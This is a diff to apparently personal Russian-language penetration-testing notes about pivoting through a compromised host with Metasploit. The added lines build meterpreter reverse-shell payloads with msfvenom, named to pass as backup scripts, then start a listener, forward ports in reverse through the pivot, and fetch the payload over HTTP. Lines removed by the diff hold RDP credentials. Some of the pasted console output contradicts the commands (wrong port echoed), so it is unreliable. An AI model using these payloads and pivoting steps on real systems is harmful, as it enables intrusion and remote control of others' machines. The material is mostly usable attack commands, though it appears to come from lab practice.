@@ -378,22 +378,33 @@ route add 10.10.10.0/23 mask 255.255.254.0 192.168.50.123
 	proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
 
 	---Предыдущее можно не писать-------
+	
 	Создание локального TCP-ретранслятора (на собственном localhost)
-	meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
-	xfreerdp /v:localhost:3300 /u:victor /p:pass@123
-	netstat -antp
+	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.15 -f exe -o backupscript.exe LPORT=9001
+	msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.16.14 -f elf -o backupjob LPORT=8001
 
-	Обратное перенаправление портов Meterpreter
-	meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
+	установка сессии на промежуточном хосте
+	use exploit/multi/handler
+	set lhost 0.0.0.0
+	set lport 8001
+	set payload linux/x64/meterpreter/reverse_tcp
+	run
+	-реверс проброс портов - промежуточный хост слушает 9001 транслирует на локальный хост 8002
+	meterpreter > portfwd add -R -l 8002 -p 9001 -L 10.10.16.14
+
 	meterpreter > bg
 
-	use exploit/multi/handler
-	set payload windows/x64/meterpreter/reverse_tcp
-	set LPORT 8081 
-	set LHOST 0.0.0.0 
-	run
+	[*] Backgrounding session 1...
+	msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+	payload => windows/x64/meterpreter/reverse_tcp
+	msf6 exploit(multi/handler) > set LPORT 8002
+	LPORT => 8081
+	msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
+	LHOST => 0.0.0.0
+	msf6 exploit(multi/handler) > run
 
-	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
+	[*] Started reverse TCP handler on 0.0.0.0:8081
+	
 	Invoke-WebRequest -Uri "http://172.16.5.129:9001/backupscript.exe" -OutFile "backupscript.exe"
 
 # ПРОБРОС ТРФИКА GOST
